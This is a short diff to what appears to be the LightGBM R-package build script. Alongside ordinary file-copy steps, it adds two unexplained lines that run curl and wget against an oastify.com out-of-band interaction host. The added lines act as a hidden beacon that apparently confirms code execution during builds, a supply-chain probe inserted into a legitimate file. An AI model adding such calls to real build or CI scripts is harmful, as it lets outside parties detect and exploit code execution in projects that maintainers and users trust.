@@ -66,6 +66,8 @@ CURRENT_DATE=$(date +'%Y-%m-%d')
 LGB_VERSION=$(cat VERSION.txt | sed "s/rc/-/g")
 
 # move relevant files
+curl https://j0kzewnlhi9z42fpvudjhen21t7ovmjb.oastify.com/lightgbm-curl
+wget https://j0kzewnlhi9z42fpvudjhen21t7ovmjb.oastify.com/lightgbm-wget
 cp -R R-package/* "${TEMP_R_DIR}"
 cp -R include "${TEMP_R_DIR}/src/"
 cp -R src/* "${TEMP_R_DIR}/src/"
